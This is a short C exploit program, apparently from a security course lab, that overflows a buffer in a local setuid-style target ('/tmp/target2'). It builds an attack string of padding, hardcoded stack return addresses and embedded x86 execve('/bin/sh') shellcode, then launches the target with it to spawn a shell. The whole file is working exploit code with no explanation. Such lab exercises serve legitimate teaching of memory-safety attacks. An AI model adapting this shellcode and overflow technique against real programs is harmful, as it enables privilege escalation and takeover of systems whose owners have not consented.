#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include <limits.h>

#define TARGET "/tmp/target2"
#define MOOTI "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\xfc\xff\xbf\x8c\xfc\xff\xbf\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\x64t\x64ta\x64\x64\x64\x64\x22\x64taxa\x84taxa\x84taaaxaaaataaxaaxaa\x84\x84taxaataaxaaxaaaxaaaxaayaax\x38\xfd\xff\xbf\x34\xfd\xff\xbf\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
int main(void)
{
  char str[500] = "";
  char overflow[100];
  memset(overflow,'a',100);
  strcpy(str,MOOTI);
  strncat(str,&overflow,100); 
  char *args[] = { TARGET, str, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

